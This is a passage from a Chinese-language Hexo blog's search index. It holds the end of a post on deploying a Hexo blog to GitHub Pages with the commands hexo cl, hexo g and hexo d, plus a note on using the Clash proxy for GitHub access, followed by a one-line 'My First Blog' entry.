class="string">https://github.com/lazy-forever/lazy-forever.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">main</span> </span><br></pre></td></tr></table></figure><h3 id="部署hexo"><a href="#部署hexo" class="headerlink" title="部署hexo"></a>部署hexo</h3><p>输入下面的命令将hexo博客部署到github中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo cl  #清理之前生成的文件</span><br><span class="line">hexo g   #生成静态页面</span><br><span class="line">hexo d   #部署</span><br></pre></td></tr></table></figure><p>隔一段时间后打开浏览器，输入 [yourname].github.io 即可看到我们部署的博客</p><h2 id="关于翻墙"><a href="#关于翻墙" class="headerlink" title="关于翻墙"></a>关于翻墙</h2><p>众所周知，中国大陆境内对于 github 的访问一直处于时常能连上时常连不上的状态，因此如果我们在执行 <code>hexo d</code> 命令时翻墙，会让部署的过程更加丝滑。</p><p>我的电脑一直在使用 clash 进行翻墙，而在 cmd 中使用<code>hexo d</code>时，clash 必须用以管理员身份打开并开启增强功能，如图：</p><img src="/2023/06/30/hexo/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2.png" class="">]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>My First Blog</title>
      <link href="/2023/05/29/hello-world/"/>
      <url>/2023/05/29/hello-world/</url>
      
        <content type="html"><![CDATA[<p>这是我的第一篇博客。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
